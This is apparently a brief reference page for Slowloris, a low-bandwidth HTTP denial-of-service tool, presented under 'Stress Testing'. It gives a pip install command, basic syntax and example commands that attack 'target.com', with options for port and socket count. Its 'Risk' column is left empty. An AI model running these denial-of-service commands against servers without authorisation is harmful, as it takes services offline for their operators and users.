Slowloris
Low bandwidth HTTP DoS tool

Stress Testing
Description
Slowloris is a denial-of-service attack tool that allows a single machine to take down a web server with minimal bandwidth by holding connections open.

Installation / Check
Check if installed:

which slowloris
Install command:

pip install slowloris
Basic Syntax
slowloris <target>
Common Commands
Command	What it does	When to use	Risk
slowloris target.com

Basic attack	Test web server	
slowloris target.com -p 8080

Custom port	Non-standard port	
slowloris target.com -s 500

Set socket count	Adjust intensity	
